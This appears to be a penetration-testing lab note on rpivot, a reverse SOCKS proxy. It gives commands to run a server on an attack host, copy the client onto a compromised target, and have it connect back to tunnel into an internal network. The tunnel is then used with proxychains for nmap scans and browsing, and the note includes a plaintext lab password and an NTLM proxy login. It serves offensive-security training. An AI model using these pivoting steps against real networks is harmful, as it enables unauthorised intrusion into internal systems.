# Rpivot

Rpivot is a reverse SOCKS proxy tool written in Python for SOCKS tunneling. 

![rpivot.png](rpivot.png)

1) Installing Python2.7 & Cloning rpivot
sudo apt-get install python2.7
sudo git clone https://github.com/klsecservices/rpivot.git

2) Running server.py from the Attack Host
python2.7 rpivot/server.py --proxy-port 9050 --server-port 9999 --server-ip 0.0.0.0

3) Transfering rpivot to the Target
scp -r rpivot ubuntu@$TARGET:/home/ubuntu/

4) Running client.py from Pivot Target
python2.7 client.py --server-ip 10.10.14.18 --server-port 9999

5) Confirming Connection is Established
New connection from host 10.129.202.64, source port 35226

6) Browsing to the Target Webserver using Proxychains
proxychains firefox-esr 172.16.5.135:80

7) Connecting to a Web Server using HTTP-Proxy & NTLM Auth
python client.py --server-ip <IPaddressofTargetWebServer> --server-port 8080 --ntlm-proxy-ip <IPaddressofProxy> --ntlm-proxy-port 8081 --domain <nameofWindowsDomain> --username <username> --password <password>

## LAB
sudo apt-get install python2.7
sudo git clone https://github.com/klsecservices/rpivot.git
python2.7 rpivot/server.py --proxy-port 9050 --server-port 9999 --server-ip 0.0.0.0
scp -r rpivot ubuntu@$TARGET:/home/ubuntu/
ssh ubuntu:@$TARGET
HTB_@cademy_stdnt!
python2.7 rpivot/client.py --server-ip 10.10.14.204 --server-port 9999
tail -4 /etc/proxychains.conf
socks4 	127.0.0.1 9050
proxychains nmap -v -sn -p80 172.16.5.1-200
proxychains firefox-esr 172.16.5.135:80
